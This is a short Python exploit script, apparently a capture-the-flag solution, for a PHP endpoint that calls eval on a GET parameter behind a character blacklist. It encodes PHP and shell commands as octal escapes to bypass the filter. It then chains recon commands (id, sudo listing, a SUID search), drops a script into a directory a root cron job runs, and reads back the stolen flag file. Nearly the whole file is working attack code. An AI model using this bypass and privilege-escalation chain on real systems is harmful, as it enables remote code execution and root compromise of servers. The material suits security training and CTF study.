#!/usr/bin/env python3
"""WAForte payload generator.

index.php does eval($_GET['code']) after stripping (case-insensitive, looped)
the chars f l a g t x and backtick. Octal escapes "\\nnn" use only backslash +
digits, so they survive the filter and rebuild ANY string -> arbitrary PHP.

Usage: python3 solve.py '<php to eval>'   (default: full exploit chain)
Then pass the printed value as ?code= (URL-encoded) to the target.
"""
import re
import sys

BLOCKED = set("flagtxFLAGTX`")


def octal(s: str) -> str:
    return "".join("\\%03o" % b for b in s.encode())


def php_system(cmd: str) -> str:
    # build "system" and the command via octal, call as variable-function
    return '$s="%s";$s("%s");' % (octal("system"), octal(cmd))


def check(code: str) -> None:
    assert not (set(code) & BLOCKED), "payload still contains a blocked char"


# exploit chain (each line = one ?code= value to send)
CHAIN = {
    "1-recon": php_system("id; ls -la /flag.txt; sudo -n -l 2>&1; "
                          "find / -perm -4000 -type f 2>/dev/null"),
    "2-drop":  php_system("echo 'cat /flag.txt > /tmp/pwned.txt; "
                          "chmod 666 /tmp/pwned.txt' > /opt/scripts/pwn.sh"),
    # after ~60s the root cron (run-scripts) executes pwn.sh; then read:
    "3-read":  '$z="%s";$z("%s");' % (octal("readfile"), octal("/tmp/pwned.txt")),
}

if __name__ == "__main__":
    if len(sys.argv) > 1:
        code = php_system(sys.argv[1]) if not sys.argv[1].startswith("$") else sys.argv[1]
        check(code)
        print(code)
    else:
        for name, code in CHAIN.items():
            check(code)
            # round-trip self-check: octal strings decode back to intent
            print(f"# {name}\n{code}\n")
